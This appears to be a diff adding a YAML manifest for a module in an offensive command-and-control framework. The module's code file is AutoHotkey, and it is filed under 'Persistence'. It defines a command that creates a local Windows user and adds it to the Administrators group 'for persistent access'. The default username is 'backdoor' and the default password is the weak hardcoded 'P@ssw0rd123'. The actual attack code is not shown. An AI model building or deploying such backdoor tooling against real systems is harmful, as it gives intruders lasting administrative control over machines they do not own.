@@ -1,0 +1,56 @@
+module:
+  id: add_admin_user
+  version: "1.0.0"
+  display_name: "Add Admin User"
+  description: "Create a local user and add to Administrators group (requires Admin)"
+
+  requires: []
+
+  provides:
+    - AddAdminUser
+
+  files:
+    - code.ahk
+
+  dispatch:
+    AddAdminUser: AddAdminUser
+
+  schema:
+    category_id: persistence
+    category_name: "Persistence"
+    modules:
+      add_admin_user:
+        display_name: "Add Admin User"
+        description: "Create a new administrative user account"
+        command_template: "execute_module|AddAdminUser|{username},{password}"
+        parameters:
+          username:
+            type: text
+            display_name: "Username"
+            description: "Username for the new administrative account"
+            required: true
+            default: "backdoor"
+            validation:
+              min_length: 1
+              max_length: 20
+              pattern: "^[a-zA-Z0-9_]+$"
+          password:
+            type: text
+            display_name: "Password"
+            description: "Password for the new administrative account"
+            required: true
+            default: "P@ssw0rd123"
+            validation:
+              min_length: 8
+              max_length: 128
+        documentation:
+          content: "Creates a new user account and adds it to the local administrators group for persistent access."
+          examples:
+            - "backdoor / P@ssw0rd123"
+        execution:
+          timeout: 60
+          requires_admin: true
+        ui:
+          layout: simple
+
+  config_options: {}
